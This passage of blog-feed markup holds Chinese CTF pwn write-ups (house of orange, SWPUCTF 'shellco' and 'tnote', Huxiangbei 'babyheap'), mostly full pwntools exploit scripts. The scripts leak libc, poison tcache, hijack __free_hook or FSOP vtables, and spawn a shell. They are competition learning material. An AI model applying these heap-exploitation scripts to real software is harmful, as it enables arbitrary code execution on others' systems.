class="line">add(<span class="number">1</span>,<span class="number">0xfff</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>申请 larginbin 之前，需要修复泄露 libc 破坏的 chunk_szie ，以后布置 prev_size ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># repair chunk_size&amp;prev_size</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>)+p64(libc_base+<span class="number">88</span>+<span class="number">0x3c4b20</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf50</span>+p64(<span class="number">0xf70</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># larginbin leak heap addr</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;182.92.203.154&quot;,28452)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">command(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite topchunk size</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>))</span><br><span class="line"><span class="comment"># frow topchunk into unsortedbin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xfff</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># repair chunk_size&amp;prev_size</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>)+p64(libc_base+<span class="number">88</span>+<span class="number">0x3c4b20</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf50</span>+p64(<span class="number">0xf70</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># larginbin leak heap addr</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">IO_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;IO_list_all:&quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP</span></span><br><span class="line"><span class="comment"># set fake struct</span></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x450+p64(0)+p64(0x21)+p64(0x0000ddaa00000003)+p64(0)</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x450</span></span><br><span class="line">fake = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake += p64(heap_base+<span class="number">0x5c8</span>) <span class="comment"># vtable</span></span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p64(system)</span><br><span class="line">payload += fake</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;b&#x27;*0x458+p64(0x60)</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xc2e)&#x27;)</span></span><br><span class="line"></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> house of orange </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 SWPUCTF 部分Pwn Writeup</title>
      <link href="archives/216/"/>
      <url>archives/216/</url>
      
        <content type="html"><![CDATA[<blockquote><p>西南石油大学“智仁杯”</p></blockquote><h2 id="shellco"><a href="#shellco" class="headerlink" title="shellco"></a>shellco</h2><blockquote><p>本地各种系统成功，远程GG</p></blockquote><p>提示 “you lost” 之后会跳转到 data 段存储的一个地址：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201207195302.png" alt="image-20201207195302677"></p><p>调试发现，写入内容是从比这个变量高的地址写入，每次写入距离都会减少 0x10 。输入内容会检查，写入 8 bit 以上会报错。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201207195810.png" alt="image-20201207195810181"></p><p>倒序写入 shellcode 。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>本地写入 17 次才会覆盖 0x600489 ，远程 7 次，调整之后依然不成功。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;49.235.209.57&quot;,10000)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaaaaab&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># asm(&quot;xor rdx, rdx&quot;)</span></span><br><span class="line"><span class="comment"># asm(&quot;xor rcx, rcx&quot;)</span></span><br><span class="line"><span class="comment"># asm(&quot;mov rbx, 0x600078&quot;)</span></span><br><span class="line"><span class="comment"># asm(&quot;mov rax, 11&quot;)</span></span><br><span class="line"><span class="comment"># asm(&quot;int 0x80&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;now\n&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">send(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x60036d&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = asm(&quot;xor rdx, rdx&quot;)+asm(&quot;xor rcx, rcx&quot;)+asm(&quot;mov rbx, r12&quot;)</span></span><br><span class="line"><span class="comment">#payload += asm(&quot;mov rax, 11&quot;)+asm(&quot;int 0x80&quot;)</span></span><br><span class="line">payload3 = asm(<span class="string">&quot;pop rax&quot;</span>)+asm(<span class="string">&quot;int 0x80&quot;</span>)</span><br><span class="line">send(payload3)</span><br><span class="line">payload2 = asm(<span class="string">&quot;push 11&quot;</span>)</span><br><span class="line">send(payload2)</span><br><span class="line">payload1 = asm(<span class="string">&quot;mov rbx, r12&quot;</span>)+asm(<span class="string">&quot;mov rax, rbp&quot;</span>)</span><br><span class="line">send(payload1)</span><br><span class="line"></span><br><span class="line">send(<span class="string">&#x27;\x99\x04&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tnote"><a href="#tnote" class="headerlink" title="tnote"></a>tnote</h2><p>一开始想去怎么 unlink 攻击堆指针结构体，最后是劫持 tcache 结构体。</p><p>edit 函数中存在 off by one ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201207172340.png" alt="image-20201207172340156"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>offbyone 修改 size 位造成堆重叠，实现修改 bin 中指针效果</li><li>释放两个 tcachebin ，利用上面实现的堆重叠泄露堆地址</li><li>通过堆地址计算出 tcache 结构体（第一个 0x250 堆），通过上面实现的堆重叠修改 tcachebin fd 指针指向结构体，第二次申请就能申请到 tcache 结构体</li><li>改 tcachebin 数量标志位；off by one 改出一个 0x90 unsortedbin（这里注意绕过 free 时各种 check ）</li><li>再用堆重叠泄露 main_arena 计算 libc 地址</li><li>复原 tcachebin 数量标志位，以及 0x20 链表首地址为 free_hook</li></ol><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.98.229.132&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">id</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">command(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">command(<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment">#0x81</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0x20=&gt;0x81-0x50=0x30</span></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh;&quot;</span>.ljust(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>)+<span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">tcache_addr = heap_addr-<span class="number">0x340</span></span><br><span class="line">log.info(<span class="string">&quot;tcache_addr:&quot;</span>+<span class="built_in">hex</span>(tcache_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tcache_addr))</span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;\xFF&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span></span><br><span class="line">log.info(<span class="string">&quot;main_arena:&quot;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">libc_base = main_arena-<span class="number">0x3ebc40</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x40</span>+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x202060)&quot;)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> SWPUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 湖湘杯 PWN WriteUp</title>
      <link href="archives/215/"/>
      <url>archives/215/</url>
      
        <content type="html"><![CDATA[<blockquote><p>比赛的时候出去玩了，这就来复盘</p></blockquote><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>增删查改，数量限制比较宽松挺大的，大小固定 0xf8 。</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>safe_read 写入大小为 0xf8 会溢出修改下一个 chunk size 最低两位为 \x00 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">safe_read</span><span class="params">(<span class="keyword">char</span> *ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, ptr, <span class="number">0xF0</span>uLL);</span><br><span class="line">  result = &amp;ptr[size];                          <span class="comment">// 当size0xf8时就会溢出修改nextchunk size 低2位</span></span><br><span class="line">  *result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>unsortedbin 泄露 libc 地址</li><li>通过将堆放入 unsortedbin 修改某一个堆的 prev_size ，然后溢出修改 size 位，制造堆重叠，申请两个指向同一地址的指针</li><li>tcache double free</li></ol><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 